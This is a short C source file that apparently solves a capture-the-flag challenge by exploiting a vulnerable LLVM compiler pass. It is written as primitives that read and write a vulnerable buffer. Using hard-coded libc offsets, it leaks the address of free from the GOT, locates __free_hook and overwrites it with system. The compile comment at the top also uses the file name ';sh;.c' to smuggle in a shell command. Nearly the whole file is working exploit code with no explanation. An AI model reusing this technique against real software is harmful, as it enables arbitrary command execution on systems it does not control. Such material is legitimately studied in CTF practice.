// clang-8 -emit-llvm -c ';sh;.c' -o attack.bc

#include <stdio.h>
#include <stdint.h>

// vuln_buf = save_value
void set();

// save_value = *vuln_buf
void load();

// *vuln_buf = save_value
void save();

// save_value += arg
void add(uint64_t);

// save_value = 0
void reset();

// one gadget failed
void ne0fucktheworld()
{
    // 77E108 - free got
    add(0x77e108);
    set();
    load();

    // 97950 - free
    // 3ed8e8 - __free_hook
    add(-0x97950 + 0x3ed8e8);
    set();
    // 4f440 - system
    add(-0x3ed8e8 + 0x4f440);
    save();
}
